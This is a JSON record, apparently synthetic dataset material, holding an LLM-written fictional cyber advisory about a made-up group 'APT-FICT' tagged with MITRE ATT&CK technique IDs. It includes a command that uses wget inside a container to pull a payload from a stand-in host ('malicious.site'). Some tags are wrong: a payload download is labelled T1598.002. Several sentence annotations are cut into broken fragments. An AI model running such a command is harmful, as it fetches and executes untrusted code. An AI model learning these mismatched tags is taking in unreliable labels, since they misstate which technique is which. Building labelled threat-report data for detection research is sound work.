@@ -1,0 +1,128 @@
+{
+    "report_id": "report_140",
+    "generated_at": "20251222_121213",
+    "scenario_target_ids": [
+        "T1598.002",
+        "T1596.001",
+        "T1590.006",
+        "T1078.001",
+        "T1200",
+        "T1609",
+        "T1204.002",
+        "T1136",
+        "T1574.014",
+        "T1098.001",
+        "T1564.013",
+        "T1087.003",
+        "T1021.007",
+        "T1659",
+        "T1008",
+        "T1567.003"
+    ],
+    "scenario_flow": [
+        "reconnaissance",
+        "reconnaissance",
+        "reconnaissance",
+        "initial-access",
+        "initial-access",
+        "execution",
+        "execution",
+        "persistence",
+        "privilege-escalation",
+        "privilege-escalation",
+        "defense-evasion",
+        "discovery",
+        "lateral-movement",
+        "command-and-control",
+        "command-and-control",
+        "exfiltration"
+    ],
+    "llm_declared_ids": [
+        "T1596.001",
+        "T1590.006",
+        "T1598.002",
+        "T1078.001",
+        "T1200",
+        "T1204.002",
+        "T1136",
+        "T1574.014",
+        "T1098.001",
+        "T1564.013",
+        "T1087.003",
+        "T1021.007",
+        "T1609",
+        "T1659",
+        "T1008",
+        "T1567.003"
+    ],
+    "actual_found_ids": [
+        "T1659",
+        "T1590.006",
+        "T1136",
+        "T1609",
+        "T1204.002",
+        "T1021.007",
+        "T1078.001",
+        "T1596.001",
+        "T1098.001",
+        "T1564.013",
+        "T1567.003",
+        "T1200",
+        "T1087.003",
+        "T1008",
+        "T1574.014",
+        "T1598.002"
+    ],
+    "clean_text": "APT-FICT likely conducts reconnaissance by performing DNS queries against multiple nameservers to gather information about subdomains and employs network reconnaissance scripts using nmap to identify active security appliances. For initial access, the actors used spearphishing attachments containing malicious PowerShell scripts designed to harvest domain credentials, exploited default Administrator accounts with weak passwords like 'admin123', and physically dropped USB Rubber Ducky devices in company parking lots for unsuspecting employees to find. Upon execution, the malware relied on users to execute malicious files, such as Mispadu variants, to gain a foothold on victim machines and employed PowerShell to download additional payloads from remote servers. For persistence, the adversary created a new local account 'temp_user' with administrative privileges using net user commands, hijacked the AppDomainManager in application configurations to maintain access, and added credentials to OAuth applications and service principals in cloud environments. To evade detection, the trojan altered bind mounts like '/proc/4444/cwd' to display legitimate directory paths instead of its actual working directory. For credential access, the threat actor ran PowerShell scripts that called Get-GlobalAddressList to harvest employee email addresses from Exchange. In discovery and lateral movement, APT-FICT executed Connect-MgGraph to access SharePoint Online and OneDrive data via cloud services and ran container administration commands such as 'docker exec malicious_container wget http://malicious.site/payload.sh' to download additional tools within Docker environments. For command and control, the malware exploited compromised ISP channels to redirect user traffic through malicious proxies and utilized fallback channels with backup C2 servers if primary servers failed. Finally, for exfiltration, the malicious tool harvested database records and stored them on text-sharing platforms. During the investigation, system logs from the fictional company 'FinSecure Corp.' showed unusual network traffic spikes and failed login attempts from unrecognized IP addresses, though these were not directly linked to the tagged techniques. Background checks revealed that FinSecure Corp. had recently migrated some services to the cloud without full security audits, but this information is provided for context only.",
+    "tagged_text": "APT-FICT likely conducts reconnaissance by performing DNS queries against multiple nameservers to gather information about subdomains [T1596.001] and employs network reconnaissance scripts using nmap to identify active security appliances [T1590.006]. For initial access, the actors used spearphishing attachments containing malicious PowerShell scripts designed to harvest domain credentials [T1598.002], exploited default Administrator accounts with weak passwords like 'admin123' [T1078.001], and physically dropped USB Rubber Ducky devices in company parking lots for unsuspecting employees to find [T1200]. Upon execution, the malware relied on users to execute malicious files, such as Mispadu variants, to gain a foothold on victim machines [T1204.002] and employed PowerShell to download additional payloads from remote servers [T1598.002]. For persistence, the adversary created a new local account 'temp_user' with administrative privileges using net user commands [T1136], hijacked the AppDomainManager in application configurations to maintain access [T1574.014], and added credentials to OAuth applications and service principals in cloud environments [T1098.001]. To evade detection, the trojan altered bind mounts like '/proc/4444/cwd' to display legitimate directory paths instead of its actual working directory [T1564.013]. For credential access, the threat actor ran PowerShell scripts that called Get-GlobalAddressList to harvest employee email addresses from Exchange [T1087.003]. In discovery and lateral movement, APT-FICT executed Connect-MgGraph to access SharePoint Online and OneDrive data via cloud services [T1021.007] and ran container administration commands such as 'docker exec malicious_container wget http://malicious.site/payload.sh' to download additional tools within Docker environments [T1609]. For command and control, the malware exploited compromised ISP channels to redirect user traffic through malicious proxies [T1659] and utilized fallback channels with backup C2 servers if primary servers failed [T1008]. Finally, for exfiltration, the malicious tool harvested database records and stored them on text-sharing platforms [T1567.003]. During the investigation, system logs from the fictional company 'FinSecure Corp.' showed unusual network traffic spikes and failed login attempts from unrecognized IP addresses, though these were not directly linked to the tagged techniques. Background checks revealed that FinSecure Corp. had recently migrated some services to the cloud without full security audits, but this information is provided for context only.",
+    "sentence_annotations": [
+        {
+            "sentence": "001], and physically dropped USB Rubber Ducky devices in company parking lots for unsuspecting employees to find.",
+            "technique_id": "T1200",
+            "technique_name": "Hardware Additions"
+        },
+        {
+            "sentence": "For persistence, the adversary created a new local account 'temp_user' with administrative privileges using net user commands, hijacked the AppDomainManager in application configurations to maintain access [T1574.",
+            "technique_id": "T1136",
+            "technique_name": "Create Account"
+        },
+        {
+            "sentence": "sh' to download additional tools within Docker environments.",
+            "technique_id": "T1609",
+            "technique_name": "Container Administration Command"
+        },
+        {
+            "sentence": "For command and control, the malware exploited compromised ISP channels to redirect user traffic through malicious proxies and utilized fallback channels with backup C2 servers if primary servers failed.",
+            "technique_id": "T1659",
+            "technique_name": "Content Injection"
+        },
+        {
+            "sentence": "For command and control, the malware exploited compromised ISP channels to redirect user traffic through malicious proxies and utilized fallback channels with backup C2 servers if primary servers failed.",
+            "technique_id": "T1008",
+            "technique_name": "Fallback Channels"
+        }
+    ],
+    "llm_raw_response": {
+        "title": "Joint Cybersecurity Advisory: Fictional APT Campaign Targeting Cloud and On-Premises Infrastructure",
+        "summary": "This advisory details a simulated campaign by a fictional advanced persistent threat (APT) group, designated as APT-FICT, targeting organizations in the financial sector. APT-FICT employs a multi-vector approach combining physical, network, and cloud-based tactics to compromise systems, establish persistence, and exfiltrate sensitive data. The campaign leverages spearphishing, hardware implants, and exploitation of default credentials, with activities spanning reconnaissance, initial access, execution, persistence, privilege escalation, defense evasion, credential access, discovery, lateral movement, collection, command and control, and exfiltration. Blue teams are advised to review detection and mitigation strategies outlined in this report.",
+        "full_report_text": "APT-FICT likely conducts reconnaissance by performing DNS queries against multiple nameservers to gather information about subdomains [T1596.001] and employs network reconnaissance scripts using nmap to identify active security appliances [T1590.006]. For initial access, the actors used spearphishing attachments containing malicious PowerShell scripts designed to harvest domain credentials [T1598.002], exploited default Administrator accounts with weak passwords like 'admin123' [T1078.001], and physically dropped USB Rubber Ducky devices in company parking lots for unsuspecting employees to find [T1200]. Upon execution, the malware relied on users to execute malicious files, such as Mispadu variants, to gain a foothold on victim machines [T1204.002] and employed PowerShell to download additional payloads from remote servers [T1598.002]. For persistence, the adversary created a new local account 'temp_user' with administrative privileges using net user commands [T1136], hijacked the AppDomainManager in application configurations to maintain access [T1574.014], and added credentials to OAuth applications and service principals in cloud environments [T1098.001]. To evade detection, the trojan altered bind mounts like '/proc/4444/cwd' to display legitimate directory paths instead of its actual working directory [T1564.013]. For credential access, the threat actor ran PowerShell scripts that called Get-GlobalAddressList to harvest employee email addresses from Exchange [T1087.003]. In discovery and lateral movement, APT-FICT executed Connect-MgGraph to access SharePoint Online and OneDrive data via cloud services [T1021.007] and ran container administration commands such as 'docker exec malicious_container wget http://malicious.site/payload.sh' to download additional tools within Docker environments [T1609]. For command and control, the malware exploited compromised ISP channels to redirect user traffic through malicious proxies [T1659] and utilized fallback channels with backup C2 servers if primary servers failed [T1008]. Finally, for exfiltration, the malicious tool harvested database records and stored them on text-sharing platforms [T1567.003]. During the investigation, system logs from the fictional company 'FinSecure Corp.' showed unusual network traffic spikes and failed login attempts from unrecognized IP addresses, though these were not directly linked to the tagged techniques. Background checks revealed that FinSecure Corp. had recently migrated some services to the cloud without full security audits, but this information is provided for context only.",
+        "techniques_used": [
+            "T1596.001",
+            "T1590.006",
+            "T1598.002",
+            "T1078.001",
+            "T1200",
+            "T1204.002",
+            "T1136",
+            "T1574.014",
+            "T1098.001",
+            "T1564.013",
+            "T1087.003",
+            "T1021.007",
+            "T1609",
+            "T1659",
+            "T1008",
+            "T1567.003"
+        ]
+    }
+}
